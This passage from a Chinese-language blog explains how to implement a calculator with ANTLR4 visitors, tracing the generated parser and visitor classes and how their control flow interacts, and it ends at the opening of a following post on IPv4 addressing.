<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javac Calculator*.java Test.java</span><br><span class="line">java Test <span class="string">&quot;in.dat&quot;</span></span><br><span class="line">line 6:14 missing <span class="string">&#x27;)&#x27;</span> at <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(prog (<span class="built_in">stat</span> (<span class="built_in">expr</span> 101) \r\n) (<span class="built_in">stat</span> a = (<span class="built_in">expr</span> 5) \r\n) (<span class="built_in">stat</span> b </span><br><span class="line">= (<span class="built_in">expr</span> 3) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> a) + (<span class="built_in">expr</span> (<span class="built_in">expr</span> b) * (<span class="built_in">expr</span> 2))) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 1) + (<span class="built_in">expr</span> a)) )) </span><br><span class="line">/ (<span class="built_in">expr</span> 2)) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 5) + (<span class="built_in">expr</span> 6)) )) * (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 4) + (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 7) - (<span class="built_in">expr</span> 8)) ))) &lt;missing <span class="string">&#x27;)&#x27;</span>&gt;)) \r\n))</span><br></pre></td></tr></table></figure>
<p>也可以不写测试类,直接使用grun测试</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\antlr&gt; grun Calculator prog </span><br><span class="line">-gui in.dat</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\antlr&gt;java org.antlr.v4.gui.TestRig Calculator prog -gui in.dat</span><br><span class="line">line 6:14 missing <span class="string">&#x27;)&#x27;</span> at <span class="string">&#x27;\r\n&#x27;</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526154940220.png"
alt="image-20230526154940220" />
<figcaption aria-hidden="true">image-20230526154940220</figcaption>
</figure>
<p>antlr会自动检测语法错误,并且会自动从错误中恢复,继续进行语法分析</p>
<h2 id="访问器">访问器</h2>
<p>前面的语法分析器中,我们并没有定义语义规则,语法树是antlr自动帮我们生成的,现在需要定义语义动作,实现计算器功能</p>
<p>antlr不推荐在g4规则文件中定义语义动作,而是在本文件中定义标签,然后在Visitor类中实现标签相关的函数</p>
<h3 id="定义语义规则标签">定义语义规则标签</h3>
<p>比如Calculator.g4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">grammar Calculator;</span><br><span class="line">// import LexerRule;</span><br><span class="line"></span><br><span class="line">// 语法定义</span><br><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID &#x27;=&#x27; expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (&#x27;*&#x27;|&#x27;/&#x27;) expr   #MulDiv</span><br><span class="line">|expr (&#x27;+&#x27;|&#x27;-&#x27;) expr        #AddSub</span><br><span class="line">|INT                        #int</span><br><span class="line">|ID                         #id</span><br><span class="line">|&#x27;(&#x27; expr &#x27;)&#x27;               #parens</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MUL: &#x27;*&#x27;;</span><br><span class="line">DIV: &#x27;/&#x27;;</span><br><span class="line">ADD: &#x27;+&#x27;;</span><br><span class="line">SUB: &#x27;-&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ID: [a-zA-Z]+;</span><br><span class="line">INT:[0-9]+;</span><br><span class="line">WS:[ \t\n]+ -&gt;skip;//多余的空格回车忽略</span><br><span class="line">NEWLINE: &#x27;\r&#x27;? &#x27;\n&#x27;;//\r\n是win上的换行符,\r是linux上的换行</span><br></pre></td></tr></table></figure>
<p>这里的#printExpr,#assign等就是标签</p>
<p>然后使用下述命令生成</p>
<h3 id="生成访问器基类">生成访问器基类</h3>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">antlr4 -visitor Calculator.g4</span><br></pre></td></tr></table></figure>
<p>额外生成了两个文件</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>CalculatorVisitor.java</td>
<td>访问器接口</td>
</tr>
<tr>
<td>CalculatorBaseVisitor.java</td>
<td>访问器基类</td>
</tr>
</tbody>
</table>
<p>这个访问器接口定义了一些函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generated from Calculator.g4 by ANTLR 4.7.2</span></span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.tree.ParseTreeVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CalculatorVisitor</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">ParseTreeVisitor</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">	T <span class="title function_">visitProg</span><span class="params">(CalculatorParser.ProgContext ctx)</span>;</span><br><span class="line"></span><br><span class="line">	T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个Calculator.g4中的标签都会对应一个接口函数,比如#printExpr对应到visitPrintExpr</p>
<p>即使是没有写标签的文法,也会对应一个接口函数,比如prog对应到visitProg</p>
<p>既然这样,为啥还要定义标签?使用默认的文法名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
<p>对比一下,prog只有一条规则,但是stat有三条规则,因此需要给每个规则定义一个标签,方便给该规则上语义动作</p>
<p>也就是说,每一个翻译规则对应一个标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stat -&gt; expr NEWLINE      #printExpr</span><br><span class="line">stat -&gt; ID &#x27;=&#x27; expr NEWLINE    #assign</span><br><span class="line">stat -&gt; NEWLINE                #blank</span><br></pre></td></tr></table></figure>
<p>要怎么用这个访问器呢?</p>
<h3 id="定制访问器">定制访问器</h3>
<p>只需要用一个EvalVisitor继承这个CalculatorBaseVisitor,然后在EvalVisitor中实现函数功能即可</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526161920122.png"
alt="image-20230526161920122" />
<figcaption aria-hidden="true">image-20230526161920122</figcaption>
</figure>
<p>不需要全都实现,因为CalculatorBaseVisitor中已经帮我们实现了默认方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> </span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> visitChildren(ctx); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以visitAssign的实现为例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Integer <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123;</span><br><span class="line">    String id=ctx.ID().getText();</span><br><span class="line">    <span class="type">int</span> value=visit(ctx.expr());</span><br><span class="line">    memory.put(id,value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>CalculatorParser.AssignContext ctx</code>是个什么玩意儿,都有啥成员?</p>
<h4 id="visit函数干了啥">visit函数干了啥?</h4>
<p>首先,CalculatorParser是antlr4命令生成的语法分析器类,AssignContext是其内部类</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526170129061.png"
alt="image-20230526170129061" />
<figcaption aria-hidden="true">image-20230526170129061</figcaption>
</figure>
<p>CalculatorParser中有众多内部类,每个标签分别对应一个内部类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AssignContext</span> <span class="keyword">extends</span> <span class="title class_">StatContext</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> TerminalNode <span class="title function_">ID</span><span class="params">()</span> &#123; <span class="keyword">return</span> getToken(CalculatorParser.ID, <span class="number">0</span>); &#125;</span><br><span class="line">	<span class="keyword">public</span> ExprContext <span class="title function_">expr</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> getRuleContext(ExprContext.class,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> TerminalNode <span class="title function_">NEWLINE</span><span class="params">()</span> &#123; <span class="keyword">return</span> getToken(CalculatorParser.NEWLINE, <span class="number">0</span>); &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">AssignContext</span><span class="params">(StatContext ctx)</span> &#123; copyFrom(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> CalculatorVisitor ) <span class="keyword">return</span> ((CalculatorVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitAssign(<span class="built_in">this</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个这种<code>*Context</code>内部类的实例,都是语法树上的节点,这一点可以观察*Context的类体系验证</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526210500945.png"
alt="image-20230526210500945" />
<figcaption aria-hidden="true">image-20230526210500945</figcaption>
</figure>
<p>任何<code>*Context</code>的直接父类都是<code>ParseRuleContext</code>类,该类中有一个<code>List&lt;ParseTree&gt; children</code>数组,用来存放子节点的句柄</p>
<p>无需置疑,这就是节点类</p>
<h5
id="evalvisitorcalculatorparserparsertree三者是如何交互的">EvalVisitor,CalculatorParser,ParserTree三者是如何交互的?</h5>
<p>跟随测试类的控制流观察</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParseTree tree=parser.prog();</span><br><span class="line">EvalVisitor eval=<span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);</span><br></pre></td></tr></table></figure>
<p>ParserTree以parser.prog()入口,可以推测该函数应该是整个递归下降语法分析的入口,其返回值是一个
以prog节点为根的语法树,然后将该树根交给句柄tree</p>
<p>根据我们自己写的文法,整个程序确实只有一个prog,然后是<code>prog-&gt;stat+</code>,也就是推导成若干stat</p>
<p>下面验证一下这个prog函数是否如我们所料</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> ProgContext <span class="title function_">prog</span><span class="params">()</span> <span class="keyword">throws</span> RecognitionException &#123;</span><br><span class="line">	<span class="type">ProgContext</span> <span class="variable">_localctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProgContext</span>(_ctx, getState());<span class="comment">//创建Context节点,ctx是context缩写,一般__ctx表示当前上下文信息,也就是父节点</span></span><br><span class="line">       </span><br><span class="line">	enterRule(_localctx, <span class="number">0</span>, RULE_prog);<span class="comment">//进入prog文法状态</span></span><br><span class="line">	<span class="type">int</span> _la;<span class="comment">//输入中的下一个词法符号的标识</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		enterOuterAlt(_localctx, <span class="number">1</span>);</span><br><span class="line">		&#123;</span><br><span class="line">		setState(<span class="number">7</span>); </span><br><span class="line">		_errHandler.sync(<span class="built_in">this</span>);</span><br><span class="line">		_la = _input.LA(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			&#123;</span><br><span class="line">			&#123;</span><br><span class="line">			setState(<span class="number">6</span>);</span><br><span class="line">			stat();</span><br><span class="line">			&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			setState(<span class="number">9</span>); </span><br><span class="line">			_errHandler.sync(<span class="built_in">this</span>);</span><br><span class="line">			_la = _input.LA(<span class="number">1</span>);<span class="comment">//从输入流中取下一个符号</span></span><br><span class="line">		&#125; <span class="keyword">while</span> ( (((_la) &amp; ~<span class="number">0x3f</span>) == <span class="number">0</span> &amp;&amp; ((<span class="number">1L</span> &lt;&lt; _la) &amp; ((<span class="number">1L</span> &lt;&lt; T__1) | (<span class="number">1L</span> &lt;&lt; ID) | (<span class="number">1L</span> &lt;&lt; INT) | (<span class="number">1L</span> &lt;&lt; NEWLINE))) != <span class="number">0</span>) );</span><br><span class="line">               <span class="comment">//只要下一个待解析的词法符号的类型是 T__1、ID、INT 或 NEWLINE 中的任意一种，就执行循环体中的语句</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (RecognitionException re) &#123;</span><br><span class="line">		_localctx.exception = re;</span><br><span class="line">		_errHandler.reportError(<span class="built_in">this</span>, re);</span><br><span class="line">		_errHandler.recover(<span class="built_in">this</span>, re);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">finally</span> &#123;</span><br><span class="line">		exitRule();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> _localctx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正如我们所料,prog函数的do-while循环中调用了stat函数</p>
<p>prog= stat stat stat...</p>
<p>这个prog函数中的do-while循环,每循环一次,递归下降分析一次stat</p>
<p>为啥do-while循环的继续条件是"下一个待解析的词法符号的类型是
T__1、ID、INT 或 NEWLINE 中的任意一种，就执行循环体中的语句"</p>
<p>所有的词法符号类型都被定义在CalculatorLexer.tokens中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">T__0=<span class="number">1</span></span><br><span class="line">T__1=<span class="number">2</span></span><br><span class="line">T__2=<span class="number">3</span></span><br><span class="line">MUL=<span class="number">4</span></span><br><span class="line">DIV=<span class="number">5</span></span><br><span class="line">ADD=<span class="number">6</span></span><br><span class="line">SUB=<span class="number">7</span></span><br><span class="line">ID=<span class="number">8</span></span><br><span class="line">INT=<span class="number">9</span></span><br><span class="line">WS=<span class="number">10</span></span><br><span class="line">NEWLINE=<span class="number">11</span></span><br><span class="line"><span class="string">&#x27;=&#x27;</span>=<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;(&#x27;</span>=<span class="number">2</span></span><br><span class="line"><span class="string">&#x27;)&#x27;</span>=<span class="number">3</span></span><br><span class="line"><span class="string">&#x27;*&#x27;</span>=<span class="number">4</span></span><br><span class="line"><span class="string">&#x27;/&#x27;</span>=<span class="number">5</span></span><br><span class="line"><span class="string">&#x27;+&#x27;</span>=<span class="number">6</span></span><br><span class="line"><span class="string">&#x27;-&#x27;</span>=<span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>T__1=='('</p>
<p>也就是说,下一个符号必须得是'(',或者ID,INT,NEWLINE</p>
<p>然而再看我们的语法规则定义</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (<span class="string">&#x27;*&#x27;</span>|<span class="string">&#x27;/&#x27;</span>) expr   #MulDiv</span><br><span class="line">|expr (<span class="string">&#x27;+&#x27;</span>|<span class="string">&#x27;-&#x27;</span>) expr        #AddSub</span><br><span class="line">|INT                        #<span class="type">int</span></span><br><span class="line">|ID                         #id</span><br><span class="line">|<span class="string">&#x27;(&#x27;</span> expr <span class="string">&#x27;)&#x27;</span>               #parens</span><br><span class="line">;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对stat求一下First集合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first(stat)=first(expr)+&#123;ID&#125;+&#123;NEWLINE&#125;=&#123;&#x27;(&#x27;,INT,ID,NEWLINE&#125;</span><br></pre></td></tr></table></figure>
<p>正好就是do-while循环的条件</p>
<p>根据编译原理的理论,只有当下一个符号在当前文法的First集合中时,才会从当前文法开始进行递归下降语法分析</p>
<p>还有一个问题,prog节点是何时把诸多stat节点设为自己的字节点的,也就是说stat节点是何时挂到语法树上的?</p>
<h5
id="stat节点何时挂到prog树根上去的">Stat节点何时挂到Prog树根上去的?</h5>
<p>到stat函数中看一看,第一行就创建了stat节点,和prog的第一行结构几乎一样,StatContext构造函数的第一个参数_ctx,这是一个全局变量,时刻维护当前节点的父节点.这样创建出的节点就知道自己的父节点是谁了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> StatContext <span class="title function_">stat</span><span class="params">()</span> <span class="keyword">throws</span> RecognitionException &#123;</span><br><span class="line">	<span class="type">StatContext</span> <span class="variable">_localctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StatContext</span>(_ctx, getState());</span><br></pre></td></tr></table></figure>
<p>这一点也可以在StatContext的构造函数中验证</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">StatContext</span><span class="params">(ParserRuleContext parent, <span class="type">int</span> invokingState)</span> &#123;<span class="comment">//第一个参数就叫做parent,显然是当前节点的父节点</span></span><br><span class="line">	<span class="built_in">super</span>(parent, invokingState);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么stat知道自己的父节点是谁了,prog又是如何知道自己的子节点是谁的呢?</p>
<p>动态调试发现,stat函数执行后,ProgContext的Chindren数组就会多一个StatContext节点,具体怎么知道的,不想深究</p>
<h3 id="回到正题visit函数干了啥">回到正题,visit函数干了啥</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParseTree tree=parser.prog();</span><br><span class="line">EvalVisitor eval=<span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);</span><br></pre></td></tr></table></figure>
<p>到现在位置,这三条的第一条分析完毕,目前tree是一个ProgContext句柄,语法树的树根</p>
<p>下面分析eval.visit(tree)干了啥</p>
<p>这个visit是AbstractParseTreeVisitor实现的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526214154072.png"
alt="image-20230526214154072" />
<figcaption aria-hidden="true">image-20230526214154072</figcaption>
</figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">visit</span><span class="params">(ParseTree tree)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> tree.accept(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个tree.accept也是一个接口方法,每一个*Context类都有实现</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526214634187.png"
alt="image-20230526214634187" />
<figcaption aria-hidden="true">image-20230526214634187</figcaption>
</figure>
<p>就以AssignContext.accept()为例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> CalculatorVisitor ) </span><br><span class="line">              <span class="keyword">return</span> ((CalculatorVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitAssign(<span class="built_in">this</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果当前节点visitor是CalculatorVisitor接口的实例,则返回visitor.visitAssign(this),也就是assign标签对应的语义动作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Integer <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123;</span><br><span class="line">    String id=ctx.ID().getText();</span><br><span class="line">    <span class="type">int</span> value=visit(ctx.expr());</span><br><span class="line">    memory.put(id,value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在知道了A.visit函数会调用EvalVisitor中当前节点对应的visitA函数</p>
<p>但是我们没有给prog-&gt;stat+定义标号,在EvalParser中并没有找到一个visitProg这样的函数,那么<code>eval.visit(tree);</code>到底调用了谁?动态调试发现调用的是CalculatorBaseVisitor类中的vistProg函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Override public T visitProg(CalculatorParser.ProgContext ctx) &#123; return visitChildren(ctx); &#125;</span><br></pre></td></tr></table></figure>
<p>而在该类中的所有vist*函数,都只是简单的递归visitChildren,访问子节点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitBlank</span><span class="params">(CalculatorParser.BlankContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>其中vistAssign等被我们在EvalVisitor重写,因此不会调用父类中的简单实现</p>
<p><strong>也就是说<code>eval.visit(tree);</code>就是中心开花了,递归访问树根ProgContext的每个子节点StatContext,然后每个stat都会再递归调用自己的子节点的visit函数,文法翻译的过程就对应了这个递归调用的过程,其中语义动作的翻译,被我们重写在EvalVisitor中,会执行我们自定义的函数.其中没有语义动作的翻译,直接调用基类中的默认实现,直接递归子节点</strong></p>
<p>到此理清了CalculatorParser,EvalVisitor,ParserTree等几个类之间的关系和控制流的流向</p>
<h3
id="总结用antlr访问器实现计算器的步骤">总结用antlr访问器实现计算器的步骤</h3>
<p>1.写Calculator.g4词法,语法规则文件,留标签为定义语法做准备</p>
<p>2.用antlr -visitor命令生成Calculator*.java一众文件</p>
<p>3.EvalVisitor类继承CalculatorBaseVisitor类</p>
<p>4.在EvalVisitor类中重写标签相对应的语义规则</p>
<p>5.编写测试类Test,于其中指定输入流,组装lexer,组装
parser,建立ParserTree,用EvalVisitor实例,访问语法树实例</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/02/12/%E7%BD%91%E7%BB%9C%E5%B1%82/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/12/%E7%BD%91%E7%BB%9C%E5%B1%82/" class="post-title-link" itemprop="url">计算机网络-网络层</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-12 18:29:00 / Modified: 18:29:10" itemprop="dateCreated datePublished" datetime="2023-02-12T18:29:00+08:00">2023-02-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="网络层">网络层</h2>
<h3 id="ipv4">IPv4</h3>
<h4 id="ipv4地址">IPv4地址</h4>
<h5 id="早期地址分类">早期地址分类</h5>
<p>最早的IP地址被划分为五类,ABCDE</p>
<p>根据前缀区分</p>
<figure>
<img
